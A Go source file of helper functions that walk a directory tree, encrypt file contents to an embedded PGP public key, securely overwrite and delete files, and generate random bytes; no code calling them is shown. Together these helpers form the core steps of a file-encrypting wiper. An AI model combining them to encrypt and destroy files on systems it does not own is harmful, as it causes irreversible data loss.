package main

import (
	"bytes"
	"crypto/rand"
	"io"
	"log"
	"os"
	"path/filepath"

	"golang.org/x/crypto/openpgp"       // Import the openpgp package for encryption
	"golang.org/x/crypto/openpgp/armor" // Import the armor package to handle armored (ASCII) encoding for PGP
)

// Public GPG Key as a string (replace this with your actual key)
var publicGPGKey = `-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: User ID:	John Doe <johndoe@gmail.com>
Comment: Valid from:	3/25/2025 11:57
Comment: Type:	4,096-bit RSA (secret key available)
Comment: Usage:	Signing, Encryption, Certifying User IDs
Comment: Fingerprint:	48976ED226FCC4880BF25959263135E016558C7D


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
=XtX9
-----END PGP PUBLIC KEY BLOCK-----`

/*
It takes in a path and content to write to that file.
It uses the os.WriteFile function to write the content to that file.
It checks for errors and logs them.
*/
func writeToFile(path string, content []byte) {
	err := os.WriteFile(path, content, 0644)
	if err != nil {
		log.Fatalln(err)
	}
}

/*
It checks if the file exists
If the file exists, it returns true
If the file does not exist, it returns false
*/
func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if err != nil {
		return false
	}
	return !info.IsDir()
}

// Read a file and return the content as byte slice.
func readFileAndReturnAsByte(path string) []byte {
	content, err := os.ReadFile(path)
	if err != nil {
		log.Fatalln(err)
	}
	return content
}

// encryptContent encrypts the provided byte slice and saves the result to an output file.
// Instead of returning errors, it prints any encountered errors.
func encryptContent(content []byte, outputFile string) {
	// Create a reader for the public key string
	pubKeyReader := bytes.NewReader([]byte(publicGPGKey))

	// Read the public key from the string
	entities, err := openpgp.ReadArmoredKeyRing(pubKeyReader)
	if err != nil {
		log.Printf("error reading public key: %v", err)
		return
	}

	// Create a reader from the content byte slice
	contentReader := bytes.NewReader(content)

	// Create the output file to save the encrypted content
	output, err := os.Create(outputFile)
	if err != nil {
		log.Printf("error creating output file: %v", err)
		return
	}
	defer output.Close()

	// Create an armored (ASCII) writer for the output file using armor.Encode
	armorWriter, err := armor.Encode(output, "PGP MESSAGE", nil)
	if err != nil {
		log.Printf("error creating armor encoder: %v", err)
		return
	}
	defer armorWriter.Close()

	// Create an encrypting writer with the public key to encrypt the content
	encWriter, err := openpgp.Encrypt(armorWriter, entities, nil, nil, nil)
	if err != nil {
		log.Printf("error setting up encryption: %v", err)
		return
	}
	defer encWriter.Close()

	// Copy the content to the encryption writer
	_, err = io.Copy(encWriter, contentReader)
	if err != nil {
		log.Printf("error copying content to encryption writer: %v", err)
		return
	}
}

// getFilename extracts the filename from a given file path.
func getFilename(path string) string {
	return filepath.Base(path) // Use filepath.Base() to get the last element (filename) from the path
}

func secureDelete(filename string) {
	// Open the file in write-only mode.
	file, err := os.OpenFile(filename, os.O_WRONLY, 0)
	if err != nil {
		// Log error if the file cannot be opened and exit the function.
		log.Println("Error opening file:", err)
		return
	}

	// Retrieve file information to determine its size.
	info, err := file.Stat()
	if err != nil {
		// Log error if file info cannot be retrieved.
		log.Println("Error getting file info:", err)
		// Close the file before returning.
		file.Close()
		return
	}
	// Get the file size in bytes.
	size := info.Size()

	// Overwrite the file contents 3 times with random data.
	for i := 0; i < 3; i++ {
		// Reset the file pointer to the beginning of the file.
		if _, err := file.Seek(0, 0); err != nil {
			// Log error if seeking fails.
			log.Println("Error seeking file:", err)
			// Close the file before returning.
			file.Close()
			return
		}

		// Create a byte slice buffer with the same length as the file.
		randomData := make([]byte, size)

		// Fill the buffer with cryptographically secure random bytes.
		if _, err := rand.Read(randomData); err != nil {
			// Log error if random data generation fails.
			log.Println("Error generating random data:", err)
			// Close the file before returning.
			file.Close()
			return
		}

		// Write the random data over the file's current contents.
		if _, err := file.Write(randomData); err != nil {
			// Log error if writing fails.
			log.Println("Error writing random data:", err)
			// Close the file before returning.
			file.Close()
			return
		}

		// Flush the file system's in-memory copy to disk.
		if err := file.Sync(); err != nil {
			// Log error if syncing fails.
			log.Println("Error syncing file:", err)
			// Close the file before returning.
			file.Close()
			return
		}
	}

	// Explicitly close the file before deletion.
	if err := file.Close(); err != nil {
		// Log error if file closing fails.
		log.Println("Error closing file before deletion:", err)
		return
	}

	// Remove the file from the file system.
	if err := os.Remove(filename); err != nil {
		// Log error if file removal fails.
		log.Println("Error deleting file:", err)
	}
}

// Walk through a route, find all the files and attach them to a slice.
func walkAndAppendPath(walkPath string) []string {
	var filePath []string
	err := filepath.Walk(walkPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if fileExists(path) {
			filePath = append(filePath, path)
		}
		return nil
	})
	if err != nil {
		log.Fatalln(err)
	}
	return filePath
}

// Generate a random byte array and return it.
func randomBytesArray(length int) []byte {
	randomBytes := make([]byte, length)
	_, err := rand.Read(randomBytes)
	if err != nil {
		log.Fatalln(err)
	}
	return randomBytes
}